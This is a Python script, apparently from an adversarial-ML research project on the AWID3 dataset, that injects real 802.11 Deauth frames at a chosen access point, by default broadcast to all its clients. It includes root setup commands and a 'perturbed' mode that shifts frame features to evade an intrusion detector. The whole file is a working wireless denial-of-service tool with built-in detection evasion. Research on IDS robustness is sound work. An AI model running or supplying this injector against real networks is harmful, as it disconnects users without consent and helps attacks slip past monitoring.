#!/usr/bin/env python3
"""
awid3_inject.py -- problem-space Deauth frame injection for the AWID3 evasion project.

Crafts and injects real 802.11 Deauth management frames via Scapy on a
monitor-mode interface (built for an Alfa AWUS036ACM on Kali Linux), in two
modes:

  --mode clean      typical/unperturbed Deauth frames ("the attack as published")
  --mode perturbed  the same frames, with the four physically-realizable
                     attacker-controllable features pushed to the edge of the
                     SAME realism budget the feature-space attack used
                     (artifacts/attack/perturbation_budget.json):
                       wlan.duration / wlan_radio.duration -> 2x the base value
                       wlan.fixed.reason_code               -> +3  (discrete bound)
                       wlan.fc.retry                        -> flipped to 1
                       frame.time_delta (inter-frame gap)   -> 2x the base value

Signal strength (radiotap.dbm_antsignal / wlan_radio.signal_dbm) and PHY data
rate (radiotap.datarate / wlan_radio.data_rate) are deliberately NOT perturbed
here: those are measured by the receiving radio from the real RF transmission,
not values an attacker writes into the frame bytes, so they can't be set the
way the feature-space attack sets them. This narrows the problem-space attack
to 4 of the 9 attacker-controllable features -- the scope-narrowing already
flagged as a risk in Progress Report 2.

MUST run as root, on Linux, with the interface already in monitor mode:

    sudo airmon-ng check kill
    sudo airmon-ng start wlan0          # creates wlan0mon
    sudo python3 awid3_inject.py --iface wlan0mon --bssid <AP MAC> \\
        --client ff:ff:ff:ff:ff:ff --mode clean     --out clean.pcap
    sudo python3 awid3_inject.py --iface wlan0mon --bssid <AP MAC> \\
        --client ff:ff:ff:ff:ff:ff --mode perturbed --out perturbed.pcap

Run this from the repo root (or point --budget at perturbation_budget.json)
so it picks up the exact same budget file awid3_attack.py used.
"""
import argparse
import json
import os
import time

from scapy.all import AsyncSniffer, RadioTap, Dot11, Dot11Deauth, sendp, wrpcap

# A typical/representative "clean" Deauth frame: reason 7 = "class3-from-nonass"
# (a common real-world deauth reason code), a NAV duration of 314us (a value
# widely seen in real deauth captures/tools), no retry flag set, 10 frames/sec.
BASE = {"reason": 7, "duration": 314, "retry": 0, "interval": 0.1}


def perturbed_values(base, budget_path):
    """Push each in-scope feature to the edge of the budget in
    perturbation_budget.json -- the same file awid3_attack.py reads from."""
    budget = {}
    if os.path.exists(budget_path):
        budget = json.load(open(budget_path))
    reason_bound = budget.get("wlan.fixed.reason_code", {}).get("raw_bound", 3.0)
    duration_rel = budget.get("wlan.duration", {}).get("relative_bound", 1.0)  # clip to [1-rel, 1+rel]x
    return {
        "reason": int(base["reason"] + reason_bound),
        "duration": int(min(base["duration"] * (1.0 + duration_rel), 65535)),
        "retry": 1 - base["retry"],
        "interval": base["interval"] * (1.0 + duration_rel),
    }


def build_frame(bssid, client, reason, duration, retry):
    fc = "retry" if retry else ""
    return (RadioTap() /
            Dot11(type=0, subtype=12, FCfield=fc, ID=duration,
                  addr1=client, addr2=bssid, addr3=bssid) /
            Dot11Deauth(reason=reason))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--iface", required=True, help="monitor-mode interface, e.g. wlan0mon")
    ap.add_argument("--bssid", required=True, help="target AP MAC address")
    ap.add_argument("--client", default="ff:ff:ff:ff:ff:ff",
                     help="target station MAC (broadcast deauth by default)")
    ap.add_argument("--mode", choices=["clean", "perturbed"], required=True)
    ap.add_argument("--n", type=int, default=50, help="number of frames to inject")
    ap.add_argument("--out", required=True, help="output pcap path for the recapture")
    ap.add_argument("--budget", default="artifacts/attack/perturbation_budget.json")
    a = ap.parse_args()

    vals = dict(BASE) if a.mode == "clean" else perturbed_values(BASE, a.budget)
    print(f"Mode={a.mode}  values={vals}")

    sniffer = AsyncSniffer(iface=a.iface, store=True)
    sniffer.start()
    time.sleep(1.0)
    for _ in range(a.n):
        pkt = build_frame(a.bssid, a.client, vals["reason"], vals["duration"], vals["retry"])
        sendp(pkt, iface=a.iface, verbose=False)
        time.sleep(vals["interval"])
    time.sleep(1.0)
    sniffer.stop()

    wrpcap(a.out, sniffer.results)
    print(f"Captured {len(sniffer.results)} frames (sent {a.n}) to {a.out}")


if __name__ == "__main__":
    main()
